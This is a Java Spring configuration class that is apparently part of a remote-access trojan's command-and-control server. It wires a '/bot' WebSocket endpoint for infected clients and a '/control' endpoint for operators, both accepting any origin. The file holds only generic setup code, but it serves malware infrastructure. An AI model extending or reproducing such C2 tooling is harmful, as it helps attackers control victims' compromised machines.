package devs.alex.sah.rat.c2server.configuration;

import devs.alex.sah.rat.c2server.webSocket.bot.BotHandshakeInterceptor;
import devs.alex.sah.rat.c2server.webSocket.bot.BotWebSocketHandler;
import devs.alex.sah.rat.c2server.webSocket.user.UserHandshakeInterceptor;
import devs.alex.sah.rat.c2server.webSocket.user.UserWebSocketHandler;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.config.annotation.WebSocketConfigurer;
import org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;

@Configuration
@EnableWebSocket
public class WebSocketConfig implements WebSocketConfigurer{

    private final BotWebSocketHandler botWebSocketHandler;
    private final BotHandshakeInterceptor botHandshakeInterceptor;

    private final UserWebSocketHandler userWebSocketHandler;
    private final UserHandshakeInterceptor userHandshakeInterceptor;

    public WebSocketConfig(BotWebSocketHandler botWebSocketHandler,
                           BotHandshakeInterceptor botHandshakeInterceptor,
                           UserWebSocketHandler userWebSocketHandler,
                           UserHandshakeInterceptor userHandshakeInterceptor) {

        this.botWebSocketHandler = botWebSocketHandler;
        this.userWebSocketHandler = userWebSocketHandler;
        this.botHandshakeInterceptor = botHandshakeInterceptor;
        this.userHandshakeInterceptor = userHandshakeInterceptor;
    }

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(botWebSocketHandler, "/bot")
                .addInterceptors(botHandshakeInterceptor)
                .setAllowedOrigins("*");

        registry.addHandler(userWebSocketHandler, "/control")
                .addInterceptors(userHandshakeInterceptor)
                .setAllowedOrigins("*");
    }
}
